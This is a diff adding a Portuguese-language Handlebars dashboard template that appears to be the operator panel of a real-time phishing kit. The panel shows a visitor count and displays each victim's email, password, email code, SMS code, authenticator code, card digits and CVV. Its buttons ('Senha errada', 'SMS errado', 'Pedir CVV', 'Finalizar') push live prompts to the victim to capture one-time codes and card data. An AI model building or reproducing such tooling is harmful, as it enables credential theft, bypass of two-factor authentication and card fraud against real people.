@@ -1,0 +1,190 @@
+{{>sidebar}}
+<!-- Main content -->
+<div class="main-content" id="panel">
+    <!-- Header -->
+    {{>topNav}}
+    <!-- Header -->
+    <div class="header bg-primary pb-6">
+        <div class="container-fluid">
+            <div class="header-body">
+                <div class="row align-items-center py-4">
+                    <div class="col-lg-6 col-7">
+                        <h6 class="h2 text-white d-inline-block mb-0">MP</h6>
+                        <nav aria-label="breadcrumb" class="d-none d-md-inline-block ml-md-4">
+                            <ol class="breadcrumb breadcrumb-links breadcrumb-dark">
+                                <li class="breadcrumb-item"><a href="#"><i class="fas fa-home"></i></a></li>
+                                <li class="breadcrumb-item"><a href="#">Dashboards</a></li>
+                                <li class="breadcrumb-item active" aria-current="page">MP</li>
+                            </ol>
+                        </nav>
+                    </div>
+                    <div class="col-lg-6 col-5 text-right">
+                        <a href="#" class="btn btn-sm btn-success btn-visitors" >Visitas ({{count}})</a>
+
+                        <a href="#" class="btn btn-sm btn-neutral" data-toggle="modal"
+                            data-target="#modalRegister">New</a>
+
+                        <a href="#" class="btn btn-sm btn-neutral btn-clean">Limpar</a>
+                        <a href="/modules/conta" target="_blank" class="btn btn-sm btn-neutral">Link</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Page content -->
+    <div class="container-fluid mt--6">
+        <div class="row">
+
+            <!-- Listagem de produtos // -->
+            <div class="col-6">
+                {{>product/list}}
+            </div>
+
+            <div class="col-6">
+                <div class="card">
+                    <div class="card-header"></div>
+                    <div class="card-body">
+                        <h3 class="card-title client-name">Operador</h3>
+                        <p class="card-text">
+                            <form client-id="" class="form-operator">
+                                <div class="form-group">
+                                <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email">
+
+                                </div>
+
+                                <div class="form-group">
+                                    <input type="text" class="form-control" id="exampleInputPassword1" placeholder="Senha">
+                                </div>
+                                <div class="form-group">
+                                    <input type="text" class="form-control" id="password6" placeholder="Código E-mail">
+                                </div>
+
+                                <div class="row mb-3">
+                                
+                                    <div class="col-auto">
+                                        <label class="sr-only" for="inlineFormInputGroup">SMS</label>
+                                        <div class="input-group mb-2">
+                                            <div class="input-group-prepend">
+                                            <div class="input-group-text">SMS</div>
+                                            </div>
+                                            <input type="text" id="inputPhoneEnd" class="form-control" placeholder="Final telefone">
+                                            <input type="text" class="form-control" id="inputSMS" placeholder="Código SMS">
+                                        </div>
+                                    </div>
+                                    <div class="col-auto">
+                                        <label class="sr-only" for="inlineFormInputGroup">Authenticator</label>
+                                        <div class="input-group mb-2">
+                                            <div class="input-group-prepend">
+                                            <div class="input-group-text">Authenticator</div>
+                                            </div>
+                                            <input type="text" class="form-control" id="inputAuthenticator" placeholder="Código authenticator">
+                                        </div>
+                                    </div>
+                                    
+                                </div>
+
+                                <div class="row mp-3">
+                                    <div class="col-2">
+                                        <select class="form-control" name="card_brand" id="selectCardBrand">
+                                            <option value="master">Master</option>
+                                            <option value="visa">Visa</option>
+                                            <option value="amex">AMEX</option>
+                                            <option value="elo">ELO</option>
+                                            <option value="dinners">Dinners</option>
+                                        </select>
+                                    </div>
+
+                                    <div class="col-3">
+                                        <label class="sr-only" for="inlineFormInputGroup">CVV</label>
+                                        <div class="input-group mb-2">
+                                            <input type="text" class="form-control" id="inputEndCard" placeholder="Dígitos">
+                                            <div class="input-group-append">
+                                            <div class="input-group-text getCVV">Pedir CVV</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-3">
+                                        <label class="sr-only" for="inlineFormInputGroup">CVV</label>
+                                        <div class="input-group mb-2">
+                                            <input type="text" class="form-control" id="inputCVV" placeholder="CVV">
+                                            <div class="input-group-append">
+                                            <div class="input-group-text">CVV</div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                            </form>
+                        </p>
+                        <a href="#" class="btn-actions btn btn-sm btn-danger" action="errorpass">Senha errada</a>
+                        <a href="#" class="btn-actions btn btn-sm btn-danger" action="erroruser">Login errado</a>
+                        <a href="#" class="btn-actions btn btn-sm btn-danger" action="errorSMS">SMS errado</a>
+                        <a href="#" class="btn-actions btn btn-sm btn-primary" action="getSMS">SMS</a>
+                        <a href="#" class="btn-actions btn btn-sm btn-primary" action="getAuth">Authenticator</a>
+                        <a href="#" class="btn-actions btn btn-sm btn-primary" action="getMailCode">Código do e-mail</a>
+                        <a href="#" class="btn-actions btn btn-info" action="FinishClient">Finalizar</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer pt-0">
+            <div class="row align-items-center justify-content-lg-between">
+                <div class="col-lg-6">
+                    <div class="copyright text-center  text-lg-left  text-muted">
+                        &copy; 2020 <a href="https://www.creative-tim.com" class="font-weight-bold ml-1"
+                            target="_blank">Creative Tim</a>
+                    </div>
+                </div>
+                <div class="col-lg-6">
+                    <ul class="nav nav-footer justify-content-center justify-content-lg-end">
+                        <li class="nav-item">
+                            <a href="https://www.creative-tim.com" class="nav-link" target="_blank">Creative Tim</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://www.creative-tim.com/presentation" class="nav-link" target="_blank">About
+                                Us</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="http://blog.creative-tim.com" class="nav-link" target="_blank">Blog</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/creativetimofficial/argon-dashboard/blob/master/LICENSE.md"
+                                class="nav-link" target="_blank">MIT License</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </footer>
+        {{>modals/register}}
+    </div>
+</div>
+{{>modals/listUsers}}
+<!--  modal password --> 
+<div class="modal fade" id="changePassModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="exampleModalLabel">Trocar a senha</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <form class="changePassForm">
+            <div class="form-group">
+                <label for="exampleInputEmail1">Nova Senha</label>
+                <input type="password" class="form-control" name="password" id="exampleInputEmail1" placeholder="Password">
+            </div>
+        </form>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+        <button type="button" class="btn btn-primary btn-changePassword">Save changes</button>
+      </div>
+    </div>
+  </div>
+</div>
+{{>modals/users}}
+
